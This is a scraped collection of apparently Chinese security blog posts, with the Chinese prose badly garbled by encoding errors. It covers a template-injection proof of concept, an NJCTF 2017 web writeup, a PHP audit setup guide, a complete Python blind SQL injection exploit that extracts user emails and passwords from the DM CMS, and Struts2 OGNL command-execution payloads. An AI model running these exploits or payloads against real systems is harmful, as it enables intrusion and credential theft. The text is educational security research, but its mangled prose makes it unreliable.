ÈÇ£‰πàÊé•‰∏ãÊù•Â∞±ÂèØ‰ª•ÊûÑÈÄ†poc‰∫ÜÔºåÁ±ª‰ººsqlÊ≥®ÂÖ•ÔºåÊàë‰ª¨ÂÖàÊääÂâçÈù¢ÁöÑifÊ†áÁ≠æËØ≠Âè•Èó≠ÂêàÔºåÂÜôÂÖ•ÊÅ∂ÊÑè‰ª£Á†ÅÂπ∂Èó≠ÂêàÂêéÈù¢ÁöÑifÊ†áÁ≠æ„ÄÇexampleÔºö}{end if}{if:1)phpinfo();if(1}{end if}Êú¨Âú∞È™åËØÅ‰∏Ä‰∏ã ÊÄªÁªìËøôÊòØ‰∏Ä‰∏™ÊØîËæÉÁªèÂÖ∏ÁöÑÊºèÊ¥ûÔºå‰πüÂèØ‰ª•Ë¢´Áß∞‰∏∫Ê®°ÁâàËß£ÊûêÂêßÊàëËßâÂæóÔºöÔºâps: ÂêéÊÇîÂïäÔºåÊ≤°ÊúâÂÖàÊèê‰∫§‰∏™pocÂπ≥Âè∞T_T"},{"title":"„ÄêCTF„ÄëNJCTF2017 writeup","permalink":"http://blog.0kami.cn/2017/03/15/old-old-njctf-2017/","text":"Ê¶ÇËø∞ËæûËÅåÂêéÊ≤°‰∫ãÊÉÖÂπ≤ÔºåÂàöÂ•ΩËµ∂‰∏änjctfÔºåËøòÊòØ‰∏ÄÊ†∑ËèúÂïäÔºåÂè™ÂÅö‰∫Ü7ÈÅìÈ¢òÔºåËøòË¶ÅÁªßÁª≠Âä™Âäõüí™Ôºàps:ÊØï‰∏öËÆæËÆ°‰ªÄ‰πàÈ¨ºÂïäÔºâÂÜô‰∏Ä‰∏ãwebÁöÑwriteupÔºåÁî±‰∫éÈ¢òÁõÆËøòÂºÄÁùÄÔºåÊääÊ≤°ÂÅöÂá∫Êù•ÁöÑÂÅö‰∏ÄÈÅçÔºåÁ∫™ÂΩï‰∏Ä‰∏ãÊàëËßâÂæóÊúâÂøÖË¶ÅËÆ∞ÁöÑÈ¢ò WebÈ¢òLoginÔºà100ÔºâÂ•ΩÂêßÔºåËøôÈÅìÈ¢òÂèñ‰∫ÜÂ∑ßÔºåË∞ÅËÆ©Â§ßÈªëÂÆ¢‰ª¨ÈÉΩÊòØÂº±ÂØÜÁ†ÅÂë¢ÔºÅÔºÅÔºÅÔºÅÁî±‰∫éÊ≤°ÊúâÂÅöÈ™åËØÅÁ†ÅÊú∫Âà∂ÔºåÊâÄ‰ª•Êâ´‰∫Ü‰∏ÄÊ≥¢Âº±Âè£‰ª§ÔºåÁÑ∂Âêé‚Ä¶ÁÑ∂ÂêéÂ∞±ËøõÂéªÂï¶ÂÖ∂ÂÆûËøôÈÅìÈ¢òËÄÉÁöÑÊòØmysqlÁöÑÈïøÂ∫¶ÈôêÂà∂ÊºèÊ¥û„ÄÇÂà©Áî®2‰∏™mysqlÁöÑÁâπÊÄß ÂΩìÊï∞ÊçÆË∂ÖËøáÂª∫Ë°®Êó∂ÁöÑËßÑÂÆöÁöÑÊï∞ÊçÆÂ§ßÂ∞èÔºåmysqlÂ∞ÜË∂ÖËøáÁöÑÈÉ®ÂàÜÊà™Êñ≠ ÂΩìselectÊó∂whereÊü•ËØ¢Â≠óÂè•‰∏≠ÁöÑÊï∞ÊçÆÂ¶ÇÊûúÊúÄÂêé‰ª•Á©∫Ê†ºÁªìÂ∞æÔºåmysqlÈªòËÆ§Â∞ÜÁ©∫Ê†ºÂéªÈô§Êü•ËØ¢ÈÇ£‰πàÂà©Áî®Ëøô2‰∏™ÁâπÊÄßÔºåÊàë‰ª¨Âè™Ë¶ÅÊ≥®ÂÜå‰∏Ä‰∏™admin+N*%20+xÂ∞±ÂèØ‰ª•Â∑≤adminÁôªÈôÜÔºåÁÑ∂ÂêégetflagÔºöNJCTF{4R3_Y0u_7H3_Re41_aDM1N?} Get Flag(100)ËøôÈÅìÈ¢òËÄÉ‰∫ÜÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÈ¶ñÂÖàÂèëÁé∞Â≠òÂú®Êñá‰ª∂‰ªªÊÑèËØªÂèñÊºèÊ¥ûÔºåÈÇ£‰πàÂ∞ùËØïËØªÂèñ‰∏Ä‰∏ãÊ∫êÁ†ÅÔºåÊúÄÂêéËØïÂá∫Êù•ÊòØapp.pyÂèØ‰ª•ÁúãÂà∞Êúâ‰∏™ÂëΩ‰ª§ÊâßË°åÂπ∂‰∏îÊòØÂèØÊéßÁöÑÔºå‰ΩÜÊòØËøáÊª§‰∫Ü‰∏Ä‰∫õÂ≠óÁ¨¶ÔºåÁî®&amp;Â∞±ÂèØ‰ª•ÁªïËøá„ÄÇls Êü•Áúã‰∏Ä‰∏ãÂèØ‰ª•ÁúãÂà∞flagÊñá‰ª∂9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flagcat‰∏ÄÊ≥¢ÔºåËøôÈáåÁöÑÁâπÊÆäÂ≠óÁ¨¶ËΩ¨ÁßªÊòØÂÖ≥ÈîÆ come on(200)ÂÖ∑‰ΩìÁúãÂ§ß‰Ω¨‰ª¨ÁöÑwriteupÂç≥ÂèØÔºåËøôÈÅìÈ¢ò‰∏ªË¶ÅÂ≠¶Âà∞‰∫ÜÂÖ∂Áõ≤Ê≥®ÁöÑÊ≥®ÂÖ•ÊñπÂºè„ÄÇbinaryÂáΩÊï∞Áî®Êù•Âå∫ÂàÜÂ§ßÂ∞èÂÜô 12345select xxx from xxx like x%select xxx from xxx like xx%select xxx from xxx like xxx%select xxx from xxx like xxxx%... ÈÄöËøálikeÊù•‰ΩèÂá∫Êï∞ÊçÆ Be Admin(300)È¶ñÂÖàÂèëÁé∞Êúâ.bakÊñá‰ª∂Ôºå‰∏ã‰∏ãÊù•Áúã‰∏Ä‰∏ã,ÂèëÁé∞ËøôÈÅìÈ¢ò‰∏ªË¶ÅËÄÉÁöÑÊòØcbcÂ≠óËäÇÁøªËΩ¨ÊîªÂáªÂíåpadding oracle attack.È¶ñÂÖàÁî±‰∫éÁôªÈôÜÂá∫Â≠òÂú®Ê≥®ÂÖ•ÔºåÊàë‰ª¨ÂèØ‰ª•ÊääÊï∞ÊçÆ‰∏≠ÁöÑencrypt_passÂèñÂá∫Êù•ÁôªÈôÜÁªïËøáÂèØ‰ª•ÈÄöËøáphpÂº±Á±ªÂûãÊØîËæÉÊù•ÁªïËøáÔºåadminÔºè0Âç≥ÂèØÁôªÈôÜË¶ÅÈÄöËøácbcÂ≠óËäÇÁøªËΩ¨ÂøÖÈ°ªÁü•ÈÅìdefaultIdÁöÑÂÄºÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂÖàË∑ëÂá∫defaultIdÁöÑÂÄºpadding oracle attackÂèÇËÄÉpadding oracle attackÁ¨¶ÂêàÊàë‰ª¨Áé∞Âú®ÁöÑÊÉÖÂÜµÔºö Â∑≤Áü•ÁúüÂÆûIV Â∑≤Áü•ÂØπÂ∫îcipher text ÂΩìËß£ÂØÜÂ§±Ë¥•ERRORÈîôËØØÈ¢òÁõÆÁéØÂ¢ÉÂèØËÉΩÂùè‰∫ÜÔºåÊú¨Âú∞Êê≠‰∏Ä‰∏ãÔºåË∑ë‰∏Ä‰∏ã‰∏≠Èó¥ÂÄºÈúÄË¶ÅÊ≥®ÊÑèÁöÑ‰∏ÄÁÇπÊòØpadding oracle attackÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶Ê≤°ÂäûÊ≥ïË∑ëÂá∫Êù•ÔºåÁî±‰∫éÊúÄÂêé‰∏Ä‰∏™Â≠óÁ¨¶Ëß£Âá∫Êù•ÊòØÁ©∫ÁôΩÊâÄ‰ª•ËøòÊòØerrorÔºå‰∏çËøáÊ≤°ÂÖ≥Á≥ªÊö¥Âäõ‰∏ÄÈÅçÂ∞±Â•Ω‰∫ÜÔºàpsÔºöÊúâ‰∫ÜÂéüÁêÜÔºåÂÜô‰ª£Á†ÅÂæàÂÆπÊòìÔºåÂ∞±‰∏çÊîæ‰ª£Á†Å‰∫ÜÔºâ ÊÄªÁªìÊ¨†Áº∫ÁöÑËøòÊòØÂæàÂ§öÔºåÁªßÁª≠üí™"},{"title":"„ÄêOTHERS„Äëphp‰ª£Á†ÅÂÆ°ËÆ°ÂâçÁöÑÂáÜÂ§á","permalink":"http://blog.0kami.cn/2017/02/03/old-old-code-review-pre-prepare/","text":"Ê¶ÇËø∞ÊâÄË∞ì‚ÄúÂ∑•Ê¨≤ÂñÑÂÖ∂‰∫ã,ÂøÖÂÖàÂà©ÂÖ∂Âô®‚ÄùÔºåÂú®‰ª£Á†ÅÂÆ°ËÆ°ÂâçÔºåÊàë‰ª¨ÈúÄË¶ÅÂáÜÂ§áÊèêÈ´òÊàë‰ª¨ÂÆ°ËÆ°ÊïàÁéáÁöÑÂ∑•ÂÖ∑„ÄÇ ÁéØÂ¢É Mac xampp(ÂèØ‰ª•Áî®phpstudyÊàñËÄÖÊòØÂÖ∂‰ªñÈõÜÊàêÁéØÂ¢É‰ª£Êõø) Navicat Premium(‰∏™‰∫∫ËÆ§‰∏∫Mac‰∏ãÊúÄÂ•ΩÁöÑÊï∞ÊçÆÂ∫ìÁÆ°ÁêÜÂ∑•ÂÖ∑ÔºåÂ≠¶ÁîüÂÖöÂè™ËÉΩÁî®**,ÊúâËÉΩÂäõÂ∞ΩÈáèÊîØÊåÅÊ≠£Áâà) phpstorm(ËøôÈáåÁöÑIDEÁî®ÁöÑÊòØÊàëËá™Â∑±ÊØîËæÉ‰π†ÊÉØÁöÑÔºå‰πüÂèØ‰ª•‰ΩøÁî®ÂÖ∂‰ªñ‰Ω†ÊØîËæÉÁÜüÊÇâÁöÑ) xdebug(Áî®Êù•Âä®ÊÄÅË∞ÉËØï) ÁªàÁ´Ø ÊµèËßàÂô®(firefox„ÄÅchrome,ËøôÈáå‰ΩøÁî®firefox,hackbarÊòØ‰∏™Â•Ω‰∏úË•ø) ÂÆâË£Ö‰∏äËø∞ÁöÑËΩØ‰ª∂‰πãÁ±ªÁöÑÂ∞±‰∏çËØ¥‰∫ÜÔºå‰∏ãÊñá‰∏ªË¶ÅÊòØÂä®ÊÄÅË∞ÉËØïÁéØÂ¢ÉÊê≠Âª∫„ÄÇ Âä®ÊÄÅË∞ÉËØïÁéØÂ¢ÉphpÊ∑ªÂä†xdebugÈÖçÁΩÆxamppÁöÑphp.ini‰Ωç‰∫é/install/path/etc/php.iniÔºåÂú®ÈÖçÁΩÆÊñá‰ª∂ÊúÄÂêéÊ∑ªÂä†‰∏ä 1234567891011[xdebug]zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.soxdebug.remote_autostart=onxdebug.remote_enable=onxdebug.remote_enable=1xdebug.remote_mode=&quot;req&quot;xdebug.remote_log=&quot;/var/log/xdebug.log&quot;xdebug.remote_host=localhost/127.0.0.1xdebug.remote_port=9000xdebug.remote_handler=&quot;dbgp&quot;xdebug.idekey=&quot;PhpStorm&quot; soÊñá‰ª∂ÊòØxamppËá™Â∏¶ÁöÑÔºåmac‰∏ãÁöÑÈÖçÁΩÆÂèØ‰ª•Áõ¥Êé•copyÊàëÁöÑ‰øùÂ≠òÂêéÈáçÂêØapache firefoxÂÆâË£ÖxdebugÊâ©Â±ïfirefox‰∏ãÁöÑxdebugÊâ©Â±ïÂè´ the easiest xdebugÔºåÊêúÁ¥¢‰∏Ä‰∏ãÂÆâË£ÖÂÆâË£ÖÂÆåÊàêÂêéÁÇπ‰∫ÆÂ∑•ÂÖ∑Ê†è‰∏äÁöÑÁî≤Ëô´ÔºåÂºÄÂêØË∞ÉËØïËÆæÁΩÆkey,Êõ¥phpÈÖçÁΩÆÊñá‰ª∂‰∏≠Áõ∏Âêå ÈÖçÁΩÆphpstormÊâìÂºÄPreferences-&gt;Languages&amp;Framework-&gt;phpÂ¶ÇÂõæËÆæÁΩÆserversÔºåÊé•ÁùÄËÆæÁΩÆdebug‰∏ãÁöÑDBGp ProxyËÆæÁΩÆÂÆåÊàêÂêéÂú®Â∑•ÂÖ∑Ê†èÂ§ÑÊâæÂà∞edit ConfigurationsÊñ∞Â¢ûphp web applicationÊé•‰∏ãÊù•Â∞±ÂèØ‰ª•ÊÑâÂø´ÁöÑ‰∏ãÊñ≠ÁÇπÔºåÂä®ÊÄÅË∞ÉËØï‰∫Ü mysqlÊâßË°åÂÆ°ËÆ°ÁõëÊéßÂú®navicatÊàñÁªàÁ´Ø‰∏≠ËøêË°å‰ª•‰∏ã2Âè• set global general_log=on;set global log_output=‚Äôtable‚Äô; Êü•Áúãmysql.general_logË°®ÂèØ‰ª•ÁúãÂà∞ËøêË°åËøáÁöÑsqlËØ≠Âè•ÔºåÊñπ‰æøÊàë‰ª¨Êü•ËØ¢win‰∏ãÂèØ‰ª•Áî®seayÁöÑ‰ª£Á†ÅÂÆ°ËÆ°Â∑•ÂÖ∑ÔºåÂ∏¶‰∫ÜmysqlÁöÑsqlÁõëÊéß ÁªàÁ´ØÁªàÁ´Ø‰∏ªË¶ÅÁî®Âà∞‰∫ÜgrepËøô‰∏™Â∑•ÂÖ∑ÔºåÁΩë‰∏äÊúâÂæàÂ§öÁõ∏ÂÖ≥ÁöÑÊïôÊùê„ÄÇ‰∏ªË¶ÅÂåπÈÖçËæìÂÖ•ËæìÂá∫ÁÇπÔºåÂç±Èô©ÂáΩÊï∞Á≠âÁ≠âÂÖ∑‰ΩìÁöÑ‰ª•ÂêéÊúâÁ©∫‰∫ÜÂÜçË°•ÂÖÖ ÊÄªÁªìËÆ∞ÂΩï‰∏Ä‰∏ãËøáÁ®ãÔºå‰ª•ÂêéËÉΩÁúãÁúãÔºåÊÑâÂø´ÁöÑ‰ª£Á†ÅÂÆ°ËÆ°Âêß:P"},{"title":"„ÄêCode Review„ÄëDM‰ºÅ‰∏öÂª∫Á´ôÁ≥ªÁªüÂâçÂè∞Áõ≤Ê≥®","permalink":"http://blog.0kami.cn/2017/01/29/old-old-DM-sql-injection/","text":"Ê¶ÇËø∞‰ªäÂ§©Êêû‰∫Ü‰∏Ä‰∏ãÂä®ÊÄÅË∞ÉËØïÁöÑ‰∏úË•øÔºåÁÑ∂ÂêéÈ°∫‰æøÁúã‰∫ÜÁúã‰∏äÊ¨°‰∏ãÁöÑDM‰ºÅ‰∏öÂª∫Á´ôÁ≥ªÁªü2017.01.23„ÄÇ ÂâçÂè∞cookie Êó∂Èó¥Áõ≤Ê≥®Â§ßËá¥Ë∑ü‰∫Ü‰∏Ä‰∏ãÂá†‰∏™ÂÖ•Âè£Êñá‰ª∂ÔºåËØ•Â•ócms‰∏ªË¶ÅÁöÑÂÆâÂÖ®Êé™ÊñΩ‰∏∫htmlentitiesÔºåÂú®POST&amp;&amp;GETÁöÑËæìÂÖ•ÁÇπÂÅö‰∫ÜhtmlÂÆû‰ΩìÂåñÁöÑÊìç‰ΩúÔºå‰ΩÜÊòØËøôÂπ∂‰∏çËΩ¨‰πâÂçïÂºïÂè∑ÔºàÈªòËÆ§‰∏çËΩ¨‰πâÂçïÂºïÂè∑ÂÖ∑‰ΩìÂèØÁúãhtmlentitiesÔºâÔºåÁúã‰∫Ü‰∏Ä‰∏ãËøõË°åÊï∞ÊçÆÂ∫ìÊü•ËØ¢ÁöÑsqlËØ≠Âè•ÔºåÊ∂âÂèäÂà∞Â≠óÁ¨¶‰∏≤Á±ªÂûãÊó∂ÔºåÈÉΩÊòØÂçïÂºïÂè∑Èó≠ÂêàÔºåÈÇ£‰πàÂæàÊ∏ÖÊ•öÔºåÂú®ËøõË°åÊï∞ÊçÆÂ∫ìÊü•ËØ¢Êó∂ÂÆπÊòì‰∫ßÁîüsqlÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇÈÇ£‰πàÊé•‰∏ãÊù•‰∏ªË¶ÅÊâæ‰∏Ä‰∏ãËøõË°åÊï∞ÊçÆÂ∫ìÊìç‰ΩúÁöÑ‰ΩçÁΩÆ„ÄÇ POST&amp;&amp;GET COOKIE psÔºöËøôÈáåÂ∞±Èöè‰æøÊâæ‰∫Ü‰∏Ä‰∏™Âú∞ÊñπÔºåÂõ†‰∏∫ËøôÂ•óÁ≥ªÁªüÊ≥®ÂÖ•‰∏çË¶ÅÂ§™Â§öÔºåËøûÂêéÂè∞ÁôªÈôÜÈÉΩÂèØ‰ª• :P ÂâçÈù¢ÊèêÂà∞ÂØπPOST&amp;&amp;GETÂÅö‰∫ÜÂÆû‰ΩìËΩ¨‰πâÔºå‰ΩÜÊòØgrepÊâæ‰∫Ü‰∏Ä‰∏ãcookieÔºåÂèëÁé∞Âπ∂Ê≤°ÊúâÂØπcookieÁöÑÂÄºËøõË°åÂÆâÂÖ®Êìç‰ΩúÔºåÁõ¥Êé•Â∏¶ÂÖ•Êï∞ÊçÆÂ∫ìÊü•ËØ¢„ÄÇindexDM_load.php Line 108 12345678910111213...if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) $curstyle = $_COOKIE[&quot;curstyle&quot;];else $curstyle = $row[&apos;curstyle&apos;]; ...$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; //echo $sqlstyle;exit;if(getnum($sqlstyle)&gt;0)&#123; $rowstyle = getrow($sqlstyle); ‰∏äËø∞‰∏∫ÊºèÊ¥ûÁöÑ‰∏ªË¶ÅÊàêÂõ†ÁÇπÔºåÂ¶ÇÊûúcookie‰∏≠Â≠òÂú®curstyle,‰ºòÂÖàÈÄâÁî®cookie‰∏≠ÁöÑÂÄºÔºåÁÑ∂ÂêéÂ∏¶ÂÖ•Êï∞ÊçÆÂ∫ìÊü•ËØ¢„ÄÇÁî±‰∫éÊ≤°ÊúâÊâæÂà∞ÂÖ∑‰ΩìÂõûÊòæÊï∞ÊçÆÁöÑÂú∞ÊñπÔºåÊâÄ‰ª•ÈááÁî®Êó∂Èó¥Áõ≤Ê≥®ÁöÑÊñπÂºèËé∑ÂèñÊï∞ÊçÆ„ÄÇ Â∏¶‰∏äËá™Â∑±ÂÜôÁöÑEXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2017/1/30import requests,timeclass CookieBlindSqlInjection: def __init__(self,url): self.url=url self.len=0 def getLength(self,column,table): payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; #first confirm bin-format data length len=0 for i in range(1,9): cookie=payload0.format(column=column,table=table,line_start=0,flag=i) flag=self.send(cookie) if flag==&quot;0&quot;: len=i break res=&quot;&quot; for i in range(1,len+1): cookie=payload1.format(column=column,col_start=i,table=table,line_start=0) flag=self.send(cookie) res+=flag # print res self.len=int(res,2) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len)) return int(res,2) def getData(self,column,table): payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; total_res=&quot;&quot; for i in range(1,self.len+1):#ÂÖ∑‰ΩìÊï∞ÊçÆÁöÑÈïøÂ∫¶ len = 0 for j in range(1, 9): cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j) flag = self.send(cookie) if flag == &quot;0&quot;: len = j break # print &quot;len:&quot;+str(len) res = &quot;&quot; for k in range(1, len + 1): cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0) flag = self.send(cookie) res += flag # print res total_res+=chr(int(res,2)) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res) return total_res def send(self,cookie): headers=&#123;&quot;Cookie&quot;:cookie&#125; try: r = requests.get(self.url, headers=headers,timeout=4) return &quot;1&quot; except: return &quot;0&quot;def pprint(flag,content): print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \\ .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)if __name__==&apos;__main__&apos;: cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;) pprint(&quot;*&quot;,&quot;program start&quot;) pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;) cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;) email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;) cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;) ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps) pprint(&quot;*&quot;, &quot;program done&quot;) ps:DMËøô‰∏™È¨ºÔºå‰ª£Á†ÅÂÜôÁöÑÂ•Ω‰π±ÂïäT_T"},{"title":"„ÄêVULNERABLITY„ÄëStruts2ÂëΩ‰ª§ÊâßË°åÂêÑÁâàÊú¨ËÆ∞ÂΩï","permalink":"http://blog.0kami.cn/2017/01/13/old-old-Struts2-history-payload/","text":"Ê¶ÇËø∞ÊúÄËøëÂú®ÂÜôStruts2ÁöÑ‰∏Ä‰∫õPoCÔºåËÆ∞ÂΩï‰∏Ä‰∏ãÂêÑ‰∏™ÁâàÊú¨ÁöÑPoCÊñπ‰æøÂà∞Êó∂ÂÄôÊü•ÈòÖ„ÄÇÂÖàÊèê‰∏Ä‰∏ãÂèÇËÄÉÁöÑÂâçËæà‰ª¨ÁöÑÁΩëÂùÄÔºåÊÑüË∞¢üôè http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html http://www.cnblogs.com/LittleHann/p/4606891.html https://cwiki.apache.org/confluence/display/WW/S2-xxx http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://cwiki.apache.org/confluence/display/WW/S2-009 Struts2ÂëΩ‰ª§ÊâßË°åÈõÜÂêà‰∏ãÊñá‰∏çÊòØÂÖ∑‰ΩìÁöÑÂàÜÊûêÊñáÔºåËÉΩÂäõÊúâÈôêÔºå‰ªÖËÆ∞ÂΩï‰∏Ä‰∏ã‰ª•ÂÅöÂ∞ÜÊù•Â§ç‰π†Êü•Áî®„ÄÇËøáÊÆµÊó∂Èó¥‰ºöÂ∞ÜÊâÄÊúâÁöÑÊºèÊ¥ûÁéØÂ¢É‰∏ä‰º†Âà∞github‰∏äÔºåÁéØÂ¢ÉÊù•Ê∫êÂ§ßÈÉ®ÂàÜ‰∏∫ÊàëÂÅ∂ÂÉèrickgrayÂçöÂÆ¢‰∏äÂÖ±‰∫´ÁöÑ‰ª•ÂèäÂÆòÁΩë‰∏ä‰∏ãÁöÑÂØπÂ∫îÁâàÊú¨ÁöÑÁ§∫‰æãÁéØÂ¢É„ÄÇupdate:2017/1/16 ÁéØÂ¢ÉÂú∞ÂùÄ Struts2 S2-001ÂΩ±ÂìçÁâàÊú¨Ôºö2.0.0 - 2.0.8 ÂÖ∑‰ΩìËØ¶ÊÉÖÔºöhttps://struts.apache.org/docs/s2-001.html ËØ•ÊºèÊ¥ûÂõ†‰∏∫Áî®Êà∑Êèê‰∫§Ë°®ÂçïÊï∞ÊçÆÂπ∂‰∏îÈ™åËØÅÂ§±Ë¥•Êó∂ÔºåÂêéÁ´Ø‰ºöÂ∞ÜÁî®Êà∑‰πãÂâçÊèê‰∫§ÁöÑÂèÇÊï∞ÂÄº‰ΩøÁî® OGNL Ë°®ËææÂºè %{value} ËøõË°åËß£ÊûêÔºåÁÑ∂ÂêéÈáçÊñ∞Â°´ÂÖÖÂà∞ÂØπÂ∫îÁöÑË°®ÂçïÊï∞ÊçÆ‰∏≠„ÄÇ‰æãÂ¶ÇÊ≥®ÂÜåÊàñÁôªÂΩïÈ°µÈù¢ÔºåÊèê‰∫§Â§±Ë¥•ÂêéÁ´Ø‰∏ÄËà¨‰ºöÈªòËÆ§ËøîÂõû‰πãÂâçÊèê‰∫§ÁöÑÊï∞ÊçÆÔºåÁî±‰∫éÂêéÁ´Ø‰ΩøÁî® %{value} ÂØπÊèê‰∫§ÁöÑÊï∞ÊçÆÊâßË°å‰∫Ü‰∏ÄÊ¨° OGNL Ë°®ËææÂºèËß£ÊûêÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÊûÑÈÄ† Payload ËøõË°åÂëΩ‰ª§ÊâßË°å ‰∏äÊñáÂºïÁî®rickgrayÁöÑÊèèËø∞„ÄÇ ÊûÑÈÄ†PoCËé∑ÂèñtomcatÊâßË°åË∑ØÂæÑ1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; Ëé∑ÂèñwebÊ†πÁõÆÂΩï1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125; ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§1%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125; Struts2 S2-005ÂΩ±ÂìçÁâàÊú¨: 2.0.0 - 2.1.8.1 ÊºèÊ¥ûËØ¶ÊÉÖ: http://struts.apache.org/docs/s2-005.html struts2ÊºèÊ¥ûÁöÑËµ∑Ê∫êÊ∫ê‰∫éS2-003(ÂèóÂΩ±ÂìçÁâàÊú¨: ‰Ωé‰∫éStruts 2.0.12)Ôºåstruts2‰ºöÂ∞ÜhttpÁöÑÊØè‰∏™ÂèÇÊï∞ÂêçËß£Êûê‰∏∫onglËØ≠Âè•ÊâßË°å(ÂèØÁêÜËß£‰∏∫java‰ª£Á†Å)„ÄÇonglË°®ËææÂºèÈÄöËøá#Êù•ËÆøÈóÆstrutsÁöÑÂØπË±°ÔºåstrutsÊ°ÜÊû∂ÈÄöËøáËøáÊª§#Â≠óÁ¨¶Èò≤Ê≠¢ÂÆâÂÖ®ÈóÆÈ¢òÔºåÁÑ∂ËÄåÈÄöËøáunicodeÁºñÁ†Å(\\u0023)Êàñ8ËøõÂà∂(\\43)Âç≥ÁªïËøá‰∫ÜÂÆâÂÖ®ÈôêÂà∂ÔºåÂØπ‰∫éS2-003ÊºèÊ¥ûÔºåÂÆòÊñπÈÄöËøáÂ¢ûÂä†ÂÆâÂÖ®ÈÖçÁΩÆ(Á¶ÅÊ≠¢ÈùôÊÄÅÊñπÊ≥ïË∞ÉÁî®ÂíåÁ±ªÊñπÊ≥ïÊâßË°åÁ≠â)Êù•‰øÆË°•Ôºå‰ΩÜÊòØÂÆâÂÖ®ÈÖçÁΩÆË¢´ÁªïËøáÂÜçÊ¨°ÂØºËá¥‰∫ÜÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî®OGNLË°®ËææÂºèËÆ≤Ëøô2‰∏™ÈÄâÈ°πÊâìÂºÄÔºåS2-003ÁöÑ‰øÆË°•ÊñπÊ°àÊääËá™Â∑±‰∏ä‰∫Ü‰∏Ä‰∏™ÈîÅÔºå‰ΩÜÊòØÊääÈîÅÈí•ÂåôÁªôÊèíÂú®‰∫ÜÈîÅÂ§¥‰∏ä ‰∏äÊñáÂºïÁî®LittleHannÁöÑÊèèËø∞ ÊûÑÈÄ†PoCËé∑ÂèñwebÊ†πÁõÆÂΩï1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))&apos;)(d))&amp;(i99)((&apos;\\43xman.getWriter().close()&apos;)(d)) 